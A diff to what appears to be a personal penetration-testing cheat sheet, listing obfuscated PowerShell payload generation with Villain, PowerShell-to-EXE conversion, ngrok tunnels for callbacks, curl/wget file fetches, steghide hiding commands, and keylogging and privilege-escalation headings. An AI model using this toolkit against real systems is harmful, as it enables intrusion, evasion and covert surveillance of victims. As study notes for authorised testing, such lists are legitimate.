@@ -59,3 +59,16 @@ ___
 - villain   (create payload powershell)
 	- generate os=windows lhost=wlan0  obfuscate
 	- generate os=windows lhost=wlan0  encode
+	- [PowerShell to EXE converter (ps2exe.azurewebsites.net)](https://ps2exe.azurewebsites.net/)
+- ngrok    https://ngrok.com/
+	- TCP NGROK TCP 2222
+	- HTTP  ngrok http 2222
+---
+- File Transfer
+	- for linux    curl http://10.10.10.1:8080/file --output file
+	-                   wget http://10.10.10.3:8080/file
+- Pivote  from one system to another system
+- Privilege Escalation
+- Steganography  [steghide embed -ef top.txt -cf cat.jpeg]
+-                            [steghide extract -sf  cat.jpeg]
+- Keylogging  (.pyw)
